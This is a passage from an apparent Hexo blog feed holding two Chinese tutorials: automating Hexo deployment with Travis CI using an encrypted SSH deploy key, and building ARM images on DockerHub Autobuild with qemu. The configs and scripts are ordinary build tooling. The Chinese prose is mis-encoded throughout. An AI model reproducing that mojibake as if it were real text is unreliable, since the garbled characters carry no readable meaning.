source:source</span><br></pre></td></tr></table></figure><p>åˆ›å»º <code>.travis.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">language: node_js</span><br><span class="line">node_js: stable</span><br></pre></td></tr></table></figure><h2 id="é…ç½®-Travis-CI"><a href="#é…ç½®-Travis-CI" class="headerlink" title="é…ç½® Travis CI"></a>é…ç½® Travis CI</h2><p>ç”¨Githubç™»å½•å¹¶ä¸”å…³è”é¡¹ç›®</p><h3 id="é…ç½®Deploy-keys"><a href="#é…ç½®Deploy-keys" class="headerlink" title="é…ç½®Deploy keys"></a>é…ç½®Deploy keys</h3><p>è®©Travis CIå¯ä»¥pushåˆ°ä½ çš„ä»“åº“</p><span id="more"></span><p>ç”Ÿæˆä¸€ä¸ª ssh å¯†é’¥å¯¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t ed25519 -f travis.key</span><br></pre></td></tr></table></figure><p>æŠŠtravis.key.pubä¸­çš„å†…å®¹ç²˜è´´åˆ°Deploy keys<br><img src="/pictures/Travis-CI-HEXO/Deploykeys.png"></p><h3 id="åŠ å¯†ç§åŒ™"><a href="#åŠ å¯†ç§åŒ™" class="headerlink" title="åŠ å¯†ç§åŒ™"></a>åŠ å¯†ç§åŒ™</h3><p>æ€»ä¸èƒ½æŠŠç§åŒ™ç›´æ¥æ”¾é¡¹ç›®é‡ŒæŠŠï¼Ÿ<br><strong>ä¸‹é¢ç¬¬ä¸€ä¸ªå‘æ¥äº†ï¼š</strong><br>æˆ‘ä»¬éœ€è¦å®‰è£… Travis çš„å‘½ä»¤è¡Œå·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install ruby</span><br><span class="line">$ sudo gem install travis</span><br></pre></td></tr></table></figure><p><strong>ç¬é—´æŠ¥é”™</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR:  Error installing ffi:</span><br><span class="line">    ERROR: Failed to build gem native extension.</span><br></pre></td></tr></table></figure><p>Googleäº†ä¸€åœˆï¼Œç¼ºä¾èµ–ï¼Œå®‰ä¸Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install ruby-dev curl</span><br></pre></td></tr></table></figure><p>å¥½äº†ï¼Œèƒ½æ­£å¸¸è¿è¡Œäº†<br>ç™»å½• Travis å¹¶åŠ å¯†æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># å¦‚æœæ˜¯ç§æœ‰é¡¹ç›®è¦åŠ  --pro å‚æ•°</span><br><span class="line">$ travis login --auto</span><br><span class="line"># åŠ å¯†å®Œæˆåä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ travis.key.enc æ–‡ä»¶</span><br><span class="line">$ travis encrypt-file travis.key -add</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨Windowsç³»ç»Ÿï¼Œåˆ°è¿™ä¸€æ­¥å°±ä¼šå„ç§æŠ¥é”™ï¼Œå®˜æ–¹ç”šè‡³ç›´æ¥æŠŠè¿™æ¡<a href="https://docs.travis-ci.com/user/encrypting-files/#caveat">å†™è¿›äº†æ–‡æ¡£</a>ï¼Œè¯´æ˜ä¸è¦åœ¨Windowsç³»ç»Ÿä¸‹æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Caveat #</span><br><span class="line">There is a report of this function not working on a local Windows machine. Please use the WSL (Windows Subsystem for Linux) or a Linux or macOS machine</span><br></pre></td></tr></table></figure><p>åŠ å¯†å®ŒæˆåæŠŠtravis.key.encæ”¾è¿›travisæ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹.travis.ymlä¼šå‘ç°å¤šäº†è¿™æ ·ä¸€è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-256-cbc -K $encrypted_************_key -iv $encrypted_************_iv </span><br><span class="line"> -in .travis/travis.key.enc -out ~/.ssh/id_rsa -d</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<code>$encrypted_************_key</code>å’Œ<code>iv</code>åº”è¯¥ä¼šè¢«è‡ªåŠ¨æ·»åŠ åˆ°Travisçš„ç¯å¢ƒå˜é‡<br>ç„¶è€Œåœ¨æˆ‘è¿™é‡Œå¹¶æ²¡æœ‰</p><p><strong>ç„¶åå°±æ˜¯ç¬¬äºŒä¸ªå‘</strong><br>ä½ éœ€è¦åœ¨è¿è¡Œ<code>$ travis encrypt-file travis.key -add</code>æ—¶åŠ ä¸Š â€“debugå‚æ•°ï¼Œè¿™æ ·å·¥å…·å°±ä¼šæ‰“å°å‡ºAPIæ—¥å¿—ï¼Œå…¶ä¸­valueé•¿åº¦ä¸º32ä½çš„æ˜¯ivï¼Œæ›´é•¿çš„æ˜¯key,ç„¶åæ‰‹åŠ¨æŠŠä»–ä»¬åŠ å…¥åˆ°Travisçš„ç¯å¢ƒå˜é‡ï¼ˆæ·»åŠ çš„æ—¶å€™ä¸è¦æŠŠå‰é¢çš„$ç¬¦å·æ‰“è¿›å»ï¼Œä¸ç„¶åˆæ˜¯æŠ¥é”™ï¼‰ï¼ˆæ‰‹è´±è¿™ä¸€ä¸‹æˆ‘è°ƒäº†åŠå¤©æ²¡æ‰¾åˆ°é”™è¯¯åœ¨é‚£â€¦â€¦ï¼‰</p><h2 id="ç¼–å†™-travis-yml"><a href="#ç¼–å†™-travis-yml" class="headerlink" title="ç¼–å†™ .travis.yml"></a>ç¼–å†™ .travis.yml</h2><figure class="highlight yaml"><figcaption><span>.travis.yml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">source</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">yarn:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">directories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">node_modules</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">themes</span></span><br><span class="line"><span class="comment"># æ·»åŠ github.comä¸ºä¿¡ä»»ä¸»æœºï¼Œä¸ç„¶git pushä¼šå¤±è´¥</span></span><br><span class="line"><span class="attr">addons:</span></span><br><span class="line">  <span class="attr">ssh_known_hosts:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">github.com</span></span><br><span class="line"></span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">openssl</span> <span class="string">aes-256-cbc</span> <span class="string">-K</span> <span class="string">$encrypted_************_key</span> <span class="string">-iv</span> <span class="string">$encrypted_************_iv</span> <span class="string">-in</span> <span class="string">travis/travis.key.enc</span> <span class="string">-out</span> <span class="string">~/.ssh/id_ed25519</span> <span class="string">-d</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">chmod</span> <span class="number">600</span> <span class="string">~/.ssh/id_ed25519</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.name</span> <span class="string">&quot;Disappear9&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.email</span> <span class="string">&quot;disappear9@outlook.com&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">chmod</span> <span class="string">+x</span> <span class="string">travis/deploy.sh</span></span><br><span class="line"></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">yarn</span></span><br><span class="line"></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line"><span class="comment"># ç”¨deploy.shæ¥git commit + git push</span></span><br><span class="line"><span class="attr">after_success:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">travis/deploy.sh</span></span><br></pre></td></tr></table></figure><p>deploy.shï¼ˆæ”¾è¿›travisæ–‡ä»¶å¤¹ï¼‰</p><figure class="highlight bash"><figcaption><span>deploy.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -ev</span><br><span class="line"><span class="built_in">export</span> TZ=<span class="string">&#x27;Asia/Shanghai&#x27;</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> --depth=1 -b master git@github.com:Disappear9/disappear9.github.io.git .deploy_git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .deploy_git</span><br><span class="line">git checkout master</span><br><span class="line"><span class="built_in">mv</span> .git/ ../public/</span><br><span class="line"><span class="built_in">cd</span> ../public</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;Site updated: `date +&quot;</span>%Y-%m-%d %H:%M:%S<span class="string">&quot;`&quot;</span></span><br><span class="line">git push origin master:master --force</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™äº›æ­¥éª¤åšå®Œåä½ çš„ç›®å½•çœ‹èµ·æ¥åº”è¯¥æ˜¯è¿™æ ·çš„<br><img src="/pictures/Travis-CI-HEXO/finish.png"></p><p><a href="https://github.com/Disappear9/disappear9.github.io/tree/source">https://github.com/Disappear9/disappear9.github.io/tree/source</a><br>æ¬¢è¿å‚è€ƒ</p><p>å®Œæˆå<code>git push origin source:source</code> è¿™æ ·Travis ciå°±ä¼šå¼€å§‹æ„å»ºäº†</p><h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><p><a href="https://blessing.studio/deploy-hexo-blog-automatically-with-travis-ci/">https://blessing.studio/deploy-hexo-blog-automatically-with-travis-ci/</a><br><a href="https://segmentfault.com/a/1190000013286548">https://segmentfault.com/a/1190000013286548</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;é…ç½®-GitHub-ä»“åº“&quot;&gt;&lt;a href=&quot;#é…ç½®-GitHub-ä»“åº“&quot; class=&quot;headerlink&quot; title=&quot;é…ç½® GitHub ä»“åº“&quot;&gt;&lt;/a&gt;é…ç½® GitHub ä»“åº“&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;æ³¨æ„ï¼šä»¥ä¸‹å…¨éƒ¨æ“ä½œå°½é‡ä¸è¦åœ¨Windowsç³»ç»Ÿä¸‹æ“ä½œ&lt;/strong&gt;&lt;br&gt;å»ºç«‹ä¸€ä¸ªsourceåˆ†æ”¯ï¼Œæ”¾å…¥&lt;code&gt;scaffolds&lt;/code&gt; &lt;code&gt;source&lt;/code&gt; &lt;code&gt;themes&lt;/code&gt;æ–‡ä»¶å¤¹å’Œ&lt;code&gt;_config.yml&lt;/code&gt; &lt;code&gt;package.json&lt;/code&gt;æ–‡ä»¶&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mkdir source&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd source&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git init&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git remote add origin git@github.com:Disappear9/disappear9.github.io.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git checkout --orphan source&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git add .&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git commit -m &amp;quot;Initial commit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git push origin source:source&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åˆ›å»º &lt;code&gt;.travis.yml&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;language: node_js&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;node_js: stable&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;é…ç½®-Travis-CI&quot;&gt;&lt;a href=&quot;#é…ç½®-Travis-CI&quot; class=&quot;headerlink&quot; title=&quot;é…ç½® Travis CI&quot;&gt;&lt;/a&gt;é…ç½® Travis CI&lt;/h2&gt;&lt;p&gt;ç”¨Githubç™»å½•å¹¶ä¸”å…³è”é¡¹ç›®&lt;/p&gt;
&lt;h3 id=&quot;é…ç½®Deploy-keys&quot;&gt;&lt;a href=&quot;#é…ç½®Deploy-keys&quot; class=&quot;headerlink&quot; title=&quot;é…ç½®Deploy keys&quot;&gt;&lt;/a&gt;é…ç½®Deploy keys&lt;/h3&gt;&lt;p&gt;è®©Travis CIå¯ä»¥pushåˆ°ä½ çš„ä»“åº“&lt;/p&gt;</summary>
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿DockerHubçš„Autobuildè‡ªåŠ¨æ„å»ºARM/å…¶ä»– æ¶æ„çš„é•œåƒ</title>
    <link href="https://thinkalone.win/Docker-ARM.html"/>
    <id>https://thinkalone.win/Docker-ARM.html</id>
    <published>2018-12-12T05:37:46.000Z</published>
    <updated>2018-12-12T05:37:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èµ·å› ï¼š"><a href="#èµ·å› ï¼š" class="headerlink" title="èµ·å› ï¼š"></a>èµ·å› ï¼š</h2><p>æœ€è¿‘åœ¨ä½¿ç”¨ <a href="https://github.com/Vector000/bilive_client">bilive_client</a>æŒ‚Bç«™çš„ç›´æ’­å’Œä¸»ç«™æ—¥å¸¸ä»»åŠ¡ï¼Œç”±äºæ¯æ¬¡æ›´æ–°éƒ½éœ€è¦é‡æ–°ç¼–è¯‘+ç®¡ç†nodeç¯å¢ƒå¤ªéº»çƒ¦ï¼Œæ‰€ä»¥å¼€å§‹ä½¿ç”¨Docker</p><h2 id="é‡åˆ°çš„å‘ï¼š"><a href="#é‡åˆ°çš„å‘ï¼š" class="headerlink" title="é‡åˆ°çš„å‘ï¼š"></a>é‡åˆ°çš„å‘ï¼š</h2><p>é¦–å…ˆï¼ŒGoogleä¸€ä¸‹æ‰¾åˆ°äº†è¿™ä¸ª<a href="https://github.com/docker/hub-feedback/issues/1261">https://github.com/docker/hub-feedback/issues/1261</a> å’Œ <a href="https://github.com/davidecavestro/mariadb-docker-armhf">https://github.com/davidecavestro/mariadb-docker-armhf</a> è¿™ä¸ªç¤ºä¾‹ï¼ŒæŒ‰ç…§é‡Œé¢è¯´çš„åœ¨DockerfileåŒçº§ç›®å½•ä¸‹å»ºç«‹hooksæ–‡ä»¶å¤¹ï¼Œå¹¶æ”¾å…¥<code>post_checkout</code>å’Œ<code>pre_build</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hooks</span><br><span class="line">|â€”â€”pre_build</span><br><span class="line">|â€”â€”post_checkout</span><br><span class="line">Dockerfile</span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>pre_build</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">docker run --<span class="built_in">rm</span> --privileged multiarch/qemu-user-static:register --reset</span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>post_checkout</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">curl -L https://github.com/balena-io/qemu/releases/download/v3.0.0%2Bresin/qemu-3.0.0+resin-arm.tar.gz | tar zxvf - -C . &amp;&amp; <span class="built_in">mv</span> qemu-3.0.0+resin-arm/qemu-arm-static .</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨Dockerfileé‡ŒåŠ å…¥ä¸€è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY qemu-arm-static /usr/bin</span><br></pre></td></tr></table></figure><p><strong>ç„¶è€Œå¹¶æ²¡æœ‰åµç”¨</strong></p><span id="more"></span><p>æ£€æŸ¥æ—¥å¿—ï¼Œå‘ç°Autobuildæç¤º<code>no such a file or dictionary</code>ï¼ˆé»‘äººé—®å·.jpgï¼‰è¿™å°±è®©äººå¤´ç–¼äº†<br>ç»§ç»­Googleï¼Œå‘ç°æœ‰äººå·²ç»åé¦ˆè¿‡è¿™ä¸ªæƒ…å†µ <a href="https://forums.docker.com/t/resolved-automated-docker-build-fails/22831">https://forums.docker.com/t/resolved-automated-docker-build-fails/22831</a> å®˜æ–¹ç¡®è®¤æ˜¯Bugè€Œä¸”è¢«æ ‡è®°ä¸ºå·²è§£å†³ï¼ˆå†æ¬¡é»‘äººé—®å·.jpgï¼‰<br><strong>è§£å†³äº†ä¸ªåµå•Šï¼Ÿ</strong></p><p>æ²¡åŠæ³•äº†ï¼Œç›´æ¥ä¸ŠäºŒæ®µæ„å»º<br>å…ˆæŠŠ<code>qemu-***-static</code>æ”¾åˆ°é¡¹ç›®é‡Œï¼Œå¦‚æœæ˜¯ï¼ˆARMv8 64ï¼‰ä½¿ç”¨<code>qemu-aarch64-static</code></p><figure class="highlight dockerfile"><figcaption><span>Dockerfile</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿™é‡Œç”¨ä»€ä¹ˆé•œåƒéƒ½å¯ä»¥ï¼Œåæ­£ä¸ä¼šå½±å“åˆ°æœ€ç»ˆè¾“å‡ºçš„é•œåƒï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯alpineï¼Œå¦‚æœç”¨debian-stretchéœ€è¦è‡ªå·±æ›´æ”¹ä¸‹é¢çš„å†…å®¹</span></span><br><span class="line"><span class="keyword">FROM</span> alpine AS builder</span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> Disappear9</span><br><span class="line"><span class="comment"># ä½¿ç”¨wgetè€Œä¸æ˜¯gitä¸‹è½½qemuï¼ŒåŠ é€Ÿæ„å»º</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk --no-cache add unzip \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; wget https://github.com/Disappear9/bilive_client_docker/archive/master.zip \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; unzip master.zip \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">mkdir</span> /qemu \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">cp</span> bilive_client_docker-master/qemu/* /qemu \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> master.zip \</span></span><br><span class="line"><span class="language-bash"><span class="comment"># ä¸‹è½½éœ€è¦ç¼–è¯‘çš„ä»£ç </span></span></span><br><span class="line">    &amp;&amp; wget https://github.com/lzghzr/bilive_client/archive/master.zip \</span><br><span class="line">    &amp;&amp; unzip master.zip \</span><br><span class="line">    &amp;&amp; mkdir /app \</span><br><span class="line">    &amp;&amp; mv bilive_client-master/* /app</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> arm32v6/node:alpine AS release</span><br><span class="line"><span class="comment"># ä»builderæŠŠqemuå¤åˆ¶åˆ°/usr/binï¼Œè¿™é‡Œå»ºè®®æŠŠéœ€è¦ç¼–è¯‘çš„ä»£ç ä¹Ÿç›´æ¥å¤åˆ¶è¿›æ¥ï¼Œè¿™æ ·ä¼šè®©layeræ›´ç¾è§‚ä¸€äº›ã€‚</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /qemu/qemu-arm-static /usr/bin</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /app /app</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€åï¼Œé™„ä¸ŠGithubåœ°å€ <a href="https://github.com/Disappear9/bilive_client_docker">https://github.com/Disappear9/bilive_client_docker</a> æ¬¢è¿å‚è€ƒ<br>DockerHubåœ°å€ <a href="https://hub.docker.com/r/disappear9/bilive_client">https://hub.docker.com/r/disappear9/bilive_client</a></p><h2 id="è¿˜æœ‰ä¸€äº›é—®é¢˜"><a href="#è¿˜æœ‰ä¸€äº›é—®é¢˜" class="headerlink" title="è¿˜æœ‰ä¸€äº›é—®é¢˜"></a>è¿˜æœ‰ä¸€äº›é—®é¢˜</h2><p>Autobuildåªæœ‰åœ¨Githubæœ‰pushæ—¶æ‰ä¼šè§¦å‘ï¼Œè¿™å°±å¾ˆå°´å°¬ï¼Œåœ¨æºç æ›´æ–°æ—¶éœ€è¦æ‰‹åŠ¨è§¦å‘â€¦â€¦</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;èµ·å› ï¼š&quot;&gt;&lt;a href=&quot;#èµ·å› ï¼š&quot; class=&quot;headerlink&quot; title=&quot;èµ·å› ï¼š&quot;&gt;&lt;/a&gt;èµ·å› ï¼š&lt;/h2&gt;&lt;p&gt;æœ€è¿‘åœ¨ä½¿ç”¨ &lt;a href=&quot;https://github.com/Vector000/bilive_client&quot;&gt;bilive_client&lt;/a&gt;æŒ‚Bç«™çš„ç›´æ’­å’Œä¸»ç«™æ—¥å¸¸ä»»åŠ¡ï¼Œç”±äºæ¯æ¬¡æ›´æ–°éƒ½éœ€è¦é‡æ–°ç¼–è¯‘+ç®¡ç†nodeç¯å¢ƒå¤ªéº»çƒ¦ï¼Œæ‰€ä»¥å¼€å§‹ä½¿ç”¨Docker&lt;/p&gt;
&lt;h2 id=&quot;é‡åˆ°çš„å‘ï¼š&quot;&gt;&lt;a href=&quot;#é‡åˆ°çš„å‘ï¼š&quot; class=&quot;headerlink&quot; title=&quot;é‡åˆ°çš„å‘ï¼š&quot;&gt;&lt;/a&gt;é‡åˆ°çš„å‘ï¼š&lt;/h2&gt;&lt;p&gt;é¦–å…ˆï¼ŒGoogleä¸€ä¸‹æ‰¾åˆ°äº†è¿™ä¸ª&lt;a href=&quot;https://github.com/docker/hub-feedback/issues/1261&quot;&gt;https://github.com/docker/hub-feedback/issues/1261&lt;/a&gt; å’Œ &lt;a href=&quot;https://github.com/davidecavestro/mariadb-docker-armhf&quot;&gt;https://github.com/davidecavestro/mariadb-docker-armhf&lt;/a&gt; è¿™ä¸ªç¤ºä¾‹ï¼ŒæŒ‰ç…§é‡Œé¢è¯´çš„åœ¨DockerfileåŒçº§ç›®å½•ä¸‹å»ºç«‹hooksæ–‡ä»¶å¤¹ï¼Œå¹¶æ”¾å…¥&lt;code&gt;post_checkout&lt;/code&gt;å’Œ&lt;code&gt;pre_build&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;hooks&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|â€”â€”pre_build&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;|â€”â€”post_checkout&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Dockerfile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight bash&quot;&gt;&lt;figcaption&gt;&lt;span&gt;pre_build&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker run --&lt;span class=&quot;built_in&quot;&gt;rm&lt;/span&gt; --privileged multiarch/qemu-user-static:register --reset&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

